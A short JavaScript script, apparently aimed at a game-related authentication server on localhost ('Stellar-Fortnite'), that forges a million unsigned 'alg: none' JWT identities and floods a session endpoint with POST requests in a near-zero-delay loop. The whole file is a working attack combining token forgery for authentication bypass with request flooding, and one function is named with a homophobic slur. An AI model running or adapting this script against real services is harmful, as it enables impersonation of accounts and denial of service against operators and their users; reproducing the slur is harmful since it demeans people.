const url = "http://localhost:8080/api/v1/auth/session";
// speed i need thissss my ms is kinda slow /j
function base64url(obj) {
    return btoa(JSON.stringify(obj))
        .replace(/=/g, "")
        .replace(/\+/g, "-")
        .replace(/\//g, "_");
}

function fAGGOT(payload) {
    return `${base64url({ alg: "none", typ: "JWT" })}.${base64url(payload)}.`;
}

const identities = [];

for (let i = 0; i < 1000000; i++) {
    identities.push(
        fAGGOT({
            iat: Math.floor(Date.now() / 1000),
            exp: 240,
            iss: "Stellar-Fortnite",
            sub: String(i + 1),
            dn: `user${i + 1}`,
            cty: "US"
        })
    );
}

setInterval(() => {
    const identity = identities[Math.floor(Math.random() * identities.length)];
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ identity })
    });
}, 0.001);